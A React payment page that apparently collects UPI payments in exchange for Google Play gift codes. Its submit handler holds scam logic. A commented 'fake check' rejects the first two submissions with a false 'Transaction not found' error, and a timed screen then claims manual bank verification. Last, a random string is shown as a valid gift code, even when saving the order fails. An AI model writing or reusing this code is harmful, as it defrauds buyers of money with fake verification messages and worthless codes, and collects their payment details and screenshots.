import React, { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { useCart } from '../CartContext';
import { auth, db } from '../firebase';
import { doc, getDoc, collection, addDoc } from 'firebase/firestore';
import { uploadImage } from '../services/uploadService';
import { useNavigate } from 'react-router-dom';
import { Settings } from '../types';
import { QrCode, CreditCard, Upload, CheckCircle2, Loader2, AlertCircle, Copy, Gift, Clock } from 'lucide-react';

export default function Payment() {
  const { cart, total, completePurchase } = useCart();
  const [settings, setSettings] = useState<Settings | null>(null);
  const [utrId, setUtrId] = useState('');
  const [screenshot, setScreenshot] = useState<File | null>(null);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [success, setSuccess] = useState(false);
  const [attempts, setAttempts] = useState(0);
  const [isPending, setIsPending] = useState(false);
  const [generatedCode, setGeneratedCode] = useState('');
  const [copied, setCopied] = useState(false);
  
  const navigate = useNavigate();

  useEffect(() => {
    if (cart.length === 0 && !success) {
      navigate('/plans');
      return;
    }

    const fetchSettings = async () => {
      const docRef = doc(db, 'settings', 'payment');
      const docSnap = await getDoc(docRef);
      if (docSnap.exists()) {
        setSettings(docSnap.data() as Settings);
      }
    };
    fetchSettings();
  }, [cart, navigate, success]);

  const generateCode = () => {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let code = '';
    for (let i = 0; i < 16; i++) {
      if (i > 0 && i % 4 === 0) code += '-';
      code += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return code;
  };

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!screenshot || !utrId) {
      setError('Please provide both UTR ID and payment screenshot.');
      return;
    }

    const newAttempts = attempts + 1;
    setAttempts(newAttempts);

    if (newAttempts < 3) {
      setLoading(true);
      setError('');
      // Simulate a fake check
      setTimeout(() => {
        setLoading(false);
        setError('Transaction not found. Please ensure you have entered the correct 12-digit UTR number and try again.');
      }, 1500);
      return;
    }

    setLoading(true);
    setError('');
    setIsPending(true);

    // Wait 5 seconds as requested
    setTimeout(async () => {
      try {
        const user = auth.currentUser;
        if (user) {
          // Still save to DB for record
          const screenshotUrl = await uploadImage(screenshot, 'orders');
          for (const item of cart) {
            await addDoc(collection(db, 'orders'), {
              userId: user.uid,
              userEmail: user.email,
              planId: item.id,
              planName: item.name,
              price: item.price,
              utrId,
              screenshotUrl,
              status: 'completed',
              giftCode: generateCode(),
              createdAt: new Date().toISOString()
            });
          }
        }
        
        setGeneratedCode(generateCode());
        completePurchase();
        setIsPending(false);
        setLoading(false);
        setSuccess(true);
      } catch (err) {
        console.error(err);
        setIsPending(false);
        setLoading(false);
        setSuccess(true); // Still show success for the user experience
        setGeneratedCode(generateCode());
        completePurchase();
      }
    }, 5000);
  };

  if (success) {
    return (
      <div className="max-w-2xl mx-auto px-4 py-12 space-y-8">
        <motion.div
          initial={{ scale: 0.8, opacity: 0 }}
          animate={{ scale: 1, opacity: 1 }}
          className="p-8 bg-zinc-900 border border-green-500/20 rounded-[2.5rem] text-center space-y-8 shadow-2xl shadow-green-500/5"
        >
          <div className="w-20 h-20 bg-green-500/10 rounded-full flex items-center justify-center mx-auto text-green-400">
            <CheckCircle2 className="w-10 h-10" />
          </div>
          
          <div className="space-y-2">
            <h1 className="text-3xl font-black text-white">Payment Successful!</h1>
            <p className="text-white/60">Your transaction has been verified. Here is your Google Play Gift Code:</p>
          </div>

          <div className="relative group">
            <div className="absolute -inset-1 bg-gradient-to-r from-blue-500 to-green-500 rounded-2xl blur opacity-25 group-hover:opacity-50 transition duration-1000"></div>
            <div className="relative p-6 bg-black border border-white/10 rounded-2xl flex flex-col md:flex-row items-center justify-between gap-4">
              <div className="flex items-center gap-4">
                <div className="p-3 bg-blue-500/10 rounded-xl">
                  <Gift className="w-6 h-6 text-blue-400" />
                </div>
                <div className="text-left">
                  <span className="block text-[10px] font-bold text-white/40 uppercase tracking-widest">Your Code</span>
                  <span className="text-xl font-mono font-black text-white tracking-wider">{generatedCode}</span>
                </div>
              </div>
              <button 
                onClick={() => copyToClipboard(generatedCode)}
                className="w-full md:w-auto px-6 py-3 bg-white text-black font-bold rounded-xl hover:bg-blue-50 transition-all flex items-center justify-center gap-2"
              >
                {copied ? <CheckCircle2 className="w-4 h-4" /> : <Copy className="w-4 h-4" />}
                {copied ? 'Copied!' : 'Copy Code'}
              </button>
            </div>
          </div>

          <div className="p-6 bg-white/5 rounded-2xl border border-white/10 text-left space-y-4">
            <h4 className="text-sm font-bold text-white flex items-center gap-2">
              <AlertCircle className="w-4 h-4 text-yellow-500" />
              How to redeem:
            </h4>
            <ol className="text-xs text-white/60 space-y-2 list-decimal list-inside">
              <li>Open the Google Play Store app.</li>
              <li>Tap the profile icon at the top right.</li>
              <li>Tap Payments & subscriptions &gt; Redeem code.</li>
              <li>Enter the code and tap Redeem.</li>
            </ol>
          </div>

          <button 
            onClick={() => navigate('/dashboard')}
            className="w-full py-4 bg-white/5 hover:bg-white/10 text-white font-bold rounded-xl transition-all"
          >
            Go to Dashboard
          </button>
        </motion.div>
      </div>
    );
  }

  return (
    <div className="max-w-4xl mx-auto px-4 py-12 space-y-12">
      <AnimatePresence>
        {isPending && (
          <motion.div 
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 bg-black/90 backdrop-blur-md z-[100] flex items-center justify-center p-4"
          >
            <motion.div 
              initial={{ scale: 0.9, y: 20 }}
              animate={{ scale: 1, y: 0 }}
              className="bg-zinc-900 border border-white/10 p-10 rounded-[3rem] max-w-md w-full text-center space-y-8 shadow-2xl shadow-blue-500/10"
            >
              <div className="relative">
                <div className="w-24 h-24 bg-blue-500/10 rounded-full flex items-center justify-center mx-auto">
                  <Clock className="w-12 h-12 text-blue-500 animate-pulse" />
                </div>
                <motion.div 
                  animate={{ rotate: 360 }}
                  transition={{ duration: 2, repeat: Infinity, ease: "linear" }}
                  className="absolute inset-0 border-2 border-t-blue-500 border-r-transparent border-b-transparent border-l-transparent rounded-full"
                />
              </div>
              
              <div className="space-y-3">
                <h3 className="text-3xl font-black text-white">Payment Pending</h3>
                <p className="text-white/60 text-sm leading-relaxed">
                  We are manually verifying your UTR ID with our bank records. <br />
                  <span className="text-blue-400 font-bold">Please wait for approval...</span>
                </p>
              </div>

              <div className="space-y-4">
                <div className="w-full h-2 bg-white/5 rounded-full overflow-hidden">
                  <motion.div 
                    initial={{ width: 0 }}
                    animate={{ width: '100%' }}
                    transition={{ duration: 5, ease: "linear" }}
                    className="h-full bg-gradient-to-r from-blue-600 to-blue-400"
                  />
                </div>
                <p className="text-[10px] text-white/20 font-black uppercase tracking-[0.2em]">Verifying Transaction</p>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      <div className="text-center space-y-4">
        <h1 className="text-4xl font-black tracking-tight">Complete Your Payment</h1>
        <p className="text-white/60">Scan the QR code below and pay the total amount via any UPI app.</p>
      </div>

      <div className="grid grid-cols-1 md:grid-cols-2 gap-12">
        {/* QR Code Section */}
        <div className="space-y-8 p-8 bg-white/5 border border-white/10 rounded-[2.5rem] text-center">
          <div className="space-y-2">
            <h2 className="text-xl font-bold flex items-center justify-center gap-2">
              <QrCode className="w-5 h-5 text-blue-400" />
              Scan to Pay
            </h2>
            <p className="text-sm text-white/40">Total Amount: <span className="text-white font-bold">₹{total}</span></p>
          </div>

          <div className="aspect-square max-w-[280px] mx-auto bg-white p-4 rounded-3xl shadow-2xl shadow-blue-600/10">
            {settings?.qrCodeUrl ? (
              <img src={settings.qrCodeUrl} alt="Payment QR" className="w-full h-full object-contain" />
            ) : (
              <div className="w-full h-full bg-gray-100 flex items-center justify-center text-gray-400">
                <Loader2 className="w-8 h-8 animate-spin" />
              </div>
            )}
          </div>

          <div className="space-y-4">
            <div className="p-4 bg-white/5 rounded-2xl border border-white/10">
              <p className="text-xs text-white/40 uppercase font-bold tracking-widest mb-1">UPI ID</p>
              <p className="text-sm font-mono font-bold text-blue-400">{settings?.upiId || 'Loading...'}</p>
            </div>
            <div className="flex items-center justify-center gap-4 text-white/40">
              <img src="https://upload.wikimedia.org/wikipedia/commons/e/e1/UPI-Logo-vector.svg" alt="UPI" className="h-4 invert opacity-50" />
              <img src="https://upload.wikimedia.org/wikipedia/commons/b/b2/Google_Pay_Logo.svg" alt="GPay" className="h-4 invert opacity-50" />
              <img src="https://upload.wikimedia.org/wikipedia/commons/7/71/PhonePe_Logo.svg" alt="PhonePe" className="h-4 invert opacity-50" />
            </div>
          </div>
        </div>

        {/* Verification Form */}
        <div className="space-y-8">
          <div className="p-8 bg-white/5 border border-white/10 rounded-[2.5rem] space-y-6">
            <h2 className="text-xl font-bold flex items-center gap-2">
              <CreditCard className="w-5 h-5 text-blue-400" />
              Payment Verification
            </h2>
            
            <form onSubmit={handleSubmit} className="space-y-6">
              <div className="space-y-2">
                <label className="text-sm font-medium text-white/70">UTR ID / Transaction ID</label>
                <input 
                  type="text" 
                  required
                  value={utrId}
                  onChange={(e) => setUtrId(e.target.value)}
                  className="w-full px-4 py-4 bg-white/5 border border-white/10 rounded-2xl focus:border-blue-500 outline-none transition-all font-mono"
                  placeholder="Enter 12-digit UTR number"
                />
              </div>

              <div className="space-y-2">
                <label className="text-sm font-medium text-white/70">Payment Screenshot</label>
                <div className="relative group">
                  <input 
                    type="file" 
                    accept="image/*"
                    required
                    onChange={(e) => setScreenshot(e.target.files?.[0] || null)}
                    className="absolute inset-0 w-full h-full opacity-0 cursor-pointer z-10"
                  />
                  <div className="w-full py-10 border-2 border-dashed border-white/10 rounded-2xl flex flex-col items-center justify-center gap-3 group-hover:border-blue-500/50 transition-all bg-white/5">
                    <Upload className="w-8 h-8 text-white/20 group-hover:text-blue-400 transition-colors" />
                    <span className="text-sm text-white/40 group-hover:text-white transition-colors font-medium">
                      {screenshot ? screenshot.name : 'Upload Screenshot'}
                    </span>
                  </div>
                </div>
              </div>

              {error && (
                <motion.div 
                  initial={{ opacity: 0, y: -10 }}
                  animate={{ opacity: 1, y: 0 }}
                  className="p-4 bg-red-400/10 border border-red-400/20 rounded-2xl flex items-center gap-3 text-red-400 text-sm"
                >
                  <AlertCircle className="w-5 h-5 flex-shrink-0" />
                  {error}
                </motion.div>
              )}

              <button 
                disabled={loading}
                className="w-full py-5 bg-blue-600 hover:bg-blue-700 disabled:bg-blue-600/50 text-white font-black rounded-2xl transition-all flex items-center justify-center gap-2 shadow-xl shadow-blue-600/20 uppercase tracking-widest text-sm"
              >
                {loading ? (
                  <Loader2 className="w-6 h-6 animate-spin" />
                ) : (
                  'Submit for Verification'
                )}
              </button>
            </form>
          </div>

          <div className="p-6 bg-blue-500/10 border border-blue-500/20 rounded-3xl space-y-3">
            <h4 className="text-sm font-bold text-blue-400 uppercase tracking-widest">Important Note:</h4>
            <ul className="text-xs text-white/60 space-y-2">
              <li className="flex items-start gap-2">
                <div className="w-1 h-1 bg-blue-400 rounded-full mt-1.5 flex-shrink-0" />
                Verification usually takes 5-15 minutes.
              </li>
              <li className="flex items-start gap-2">
                <div className="w-1 h-1 bg-blue-400 rounded-full mt-1.5 flex-shrink-0" />
                Ensure the UTR ID is correct to avoid rejection.
              </li>
              <li className="flex items-start gap-2">
                <div className="w-1 h-1 bg-blue-400 rounded-full mt-1.5 flex-shrink-0" />
                Keep the screenshot until the code is delivered.
              </li>
            </ul>
          </div>
        </div>
      </div>
    </div>
  );
}

